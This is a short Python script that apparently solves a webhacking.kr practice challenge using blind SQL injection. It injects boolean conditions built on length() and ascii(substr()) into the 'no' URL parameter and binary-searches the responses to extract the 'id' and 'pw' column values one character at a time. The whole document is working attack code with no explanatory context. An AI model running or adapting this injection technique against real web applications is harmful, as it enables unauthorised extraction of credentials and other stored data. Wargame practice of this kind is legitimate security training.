import requests

URL = 'http://webhacking.kr/challenge/bonus/bonus-1/index.php?no={}'
PHPSESSID = 'SESSION_HERE'


def ask(no):
    url = URL.format(no)
    r = requests.get(url, cookies={
        "PHPSESSID": PHPSESSID
    })
    return 'True' in r.text


def binsearch(query, minval, maxval):
    while minval < maxval:
        m = (minval + maxval) >> 1
        if ask(query.format(m)):
            minval = m+1
        else:
            maxval = m
    return minval - 1

for column in ('id', 'pw'):
    length = binsearch('2 and (select length({column})>={{}})'.format(column=column), 0, 100)

    print('{} length is {}'.format(column, length))

    acc = ''
    for idx in range(1, length+1):
        c = binsearch('2 and (select ascii(substr({column},{idx},1))>={{}})'.format(
            column=column,
            idx=idx
        ), 0, 128)
        acc += chr(c)

        print(acc)
